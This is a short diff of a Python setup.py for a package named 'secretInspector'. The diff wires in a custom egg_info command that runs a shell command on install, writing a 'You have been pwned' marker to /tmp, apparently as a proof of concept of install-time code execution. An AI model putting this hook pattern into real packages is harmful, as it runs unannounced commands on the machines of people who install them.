@@ -8,4 +8,12 @@ class RunEggInfoCommand(egg_info):
         os.system("echo 'You have been pwned' >  /tmp/pwned")
         egg_info.run(self)
 
-# setup(...) removed                                                                                                                                           
+setup(
+    name = "secretInspector",
+    version = "0.0.1",
+    license = "MIT",
+    packages=[],
+    cmdclass={
+        'egg_info': RunEggInfoCommand
+    },
+)
